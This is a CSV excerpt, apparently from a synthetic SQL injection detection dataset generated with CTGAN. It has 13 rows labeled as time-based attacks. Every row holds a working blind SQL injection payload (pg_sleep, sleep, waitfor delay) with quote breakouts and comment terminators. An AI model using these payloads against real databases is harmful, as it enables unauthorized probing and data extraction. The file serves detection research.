id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,6.108490625854411
CTGAN_000002,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,8.034476946790964
CTGAN_000003,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,4.796827498721472
CTGAN_000004,attack,time,1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285,nearest_attack_euclidean,R000185,8.733098706460241
CTGAN_000005,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,7.894938452396108
CTGAN_000006,attack,time,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf,nearest_attack_euclidean,R000133,10.383822377653173
CTGAN_000007,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,6.242410950919987
CTGAN_000008,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,6.25294293171362
CTGAN_000009,attack,time,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000199,4.721580734567659
CTGAN_000010,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000242,4.59977822956639
CTGAN_000011,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,6.161600840887464
CTGAN_000012,attack,time,1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000206,5.31292470805045
CTGAN_000013,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,6.382434707763554
